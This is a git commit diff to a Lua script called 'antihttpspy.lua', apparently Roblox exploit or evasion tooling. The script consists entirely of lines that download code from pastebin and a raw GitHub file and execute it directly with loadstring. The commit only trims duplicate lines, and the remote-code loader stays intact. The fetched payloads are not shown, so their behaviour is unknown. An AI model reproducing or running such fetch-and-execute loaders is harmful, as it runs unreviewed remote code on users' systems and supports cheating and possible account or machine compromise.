03fd651ed4836c992819ae01216f48c772a2b968
KermitTheBooter <61944383+KermitTheBooter@users.noreply.github.com>
2023-08-14 00:32:08 -0400

    Update antihttpspy.lua

--- antihttpspy.lua
+++ antihttpspy.lua
@@ -14,12 +14,8 @@ while true do
     loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/I0WFZa0D8qwR4xZFpwpWawI7WBPnqXkuPedC54tAKaNNht0iUfLVz35ubCOY76unC9BmVXgHKxEPV8Vy1g-XCA-/main/1blacklist%20-%20Copy%20(14).lua"))()
     loadstring(game:HttpGet("https://pastebin.com/raw/y1WvkSP4"))()
     loadstring(game:HttpGet("https://pastebin.com/raw/y1WvkSP4"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/I0WFZa0D8qwR4xZFpwpWawI7WBPnqXkuPedC54tAKaNNht0iUfLVz35ubCOY76unC9BmVXgHKxEPV8Vy1g-XCA-/main/1blacklist%20-%20Copy%20(14).lua"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/I0WFZa0D8qwR4xZFpwpWawI7WBPnqXkuPedC54tAKaNNht0iUfLVz35ubCOY76unC9BmVXgHKxEPV8Vy1g-XCA-/main/1blacklist%20-%20Copy%20(14).lua"))()
     loadstring(game:HttpGet("https://pastebin.com/raw/GHamr0X9"))()
     loadstring(game:HttpGet("https://pastebin.com/raw/7j55S8U7"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/I0WFZa0D8qwR4xZFpwpWawI7WBPnqXkuPedC54tAKaNNht0iUfLVz35ubCOY76unC9BmVXgHKxEPV8Vy1g-XCA-/main/1blacklist%20-%20Copy%20(14).lua"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/I0WFZa0D8qwR4xZFpwpWawI7WBPnqXkuPedC54tAKaNNht0iUfLVz35ubCOY76unC9BmVXgHKxEPV8Vy1g-XCA-/main/1blacklist%20-%20Copy%20(14).lua"))()
     loadstring(game:HttpGet("https://pastebin.com/raw/LKMciReA"))()
     loadstring(game:HttpGet("https://pastebin.com/raw/LuirA6D0"))()
     loadstring(game:HttpGet("https://pastebin.com/raw/BUs1Tww0"))()
@@ -29,7 +25,5 @@ while true do
     loadstring(game:HttpGet("https://pastebin.com/raw/LKMciReA"))()
     loadstring(game:HttpGet("https://pastebin.com/raw/LuirA6D0"))()
     loadstring(game:HttpGet("https://pastebin.com/raw/BUs1Tww0"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/I0WFZa0D8qwR4xZFpwpWawI7WBPnqXkuPedC54tAKaNNht0iUfLVz35ubCOY76unC9BmVXgHKxEPV8Vy1g-XCA-/main/1blacklist%20-%20Copy%20(14).lua"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/I0WFZa0D8qwR4xZFpwpWawI7WBPnqXkuPedC54tAKaNNht0iUfLVz35ubCOY76unC9BmVXgHKxEPV8Vy1g-XCA-/main/1blacklist%20-%20Copy%20(14).lua"))()
    break
 end
